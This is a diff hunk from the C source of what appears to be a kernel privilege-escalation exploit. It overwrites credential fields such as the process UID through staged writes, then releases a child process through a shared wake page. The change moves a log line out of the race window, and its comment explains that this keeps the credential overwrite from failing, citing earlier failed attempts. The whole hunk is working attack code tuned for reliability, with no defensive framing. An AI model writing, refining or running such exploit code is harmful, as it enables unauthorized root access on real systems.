@@ -3493,13 +3493,16 @@ int main(int argc, char **argv)
         if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
             park_forever("fake uid fix failed");
     }
-    logf("[+] cred writes landed, waking child\n");
-
+    /* The wake is the window: no log line (a stdout write costs milliseconds)
+     * between the last cred write and the release, and none between the release
+     * and the child's next syscall. Logged after (2026-11-28, the tcp route's
+     * consumer log of the same shape lost the write on every attempt). */
     if (g_wake_page)
         __atomic_store_n(&g_wake_page[WAKE_GO], 1u, __ATOMIC_RELEASE);
     if (write(go_fd, "A", 1) != 1)
         logf("[!] child wake write failed\n");
     close(go_fd);
+    logf("[+] cred writes landed, child released\n");
 
     {
         struct child_report rep;
